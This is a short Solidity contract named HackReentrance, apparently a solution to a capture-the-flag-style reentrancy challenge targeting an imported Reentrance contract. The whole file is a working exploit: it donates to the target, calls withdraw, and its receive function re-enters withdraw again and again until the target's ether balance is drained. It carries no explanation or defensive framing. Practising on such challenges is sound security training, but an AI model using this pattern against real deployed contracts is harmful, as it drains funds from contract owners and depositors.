// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract HackReentrance {

  Reentrance public cnt;

  constructor(address payable _cntAddress) public {
    cnt = Reentrance(_cntAddress);
  }

  function startAttack(uint amount) public {
    cnt.donate{value: amount}(address(this));
    cnt.withdraw(cnt.balanceOf(address(this)));
  }

  function balance() public view returns (uint) {
    return address(this).balance;
  }

  function transfer(address _to, uint amount) public {
    address(_to).call{value: amount}("");
  }

  receive() external payable {
    if (msg.sender == address(cnt)) {
      if (address(cnt).balance > 0) {
        uint amount = (address(cnt).balance >= cnt.balanceOf(address(this)))
        ? cnt.balanceOf(address(this)) : address(cnt).balance;
        cnt.withdraw(amount);
      }
    }
  }
}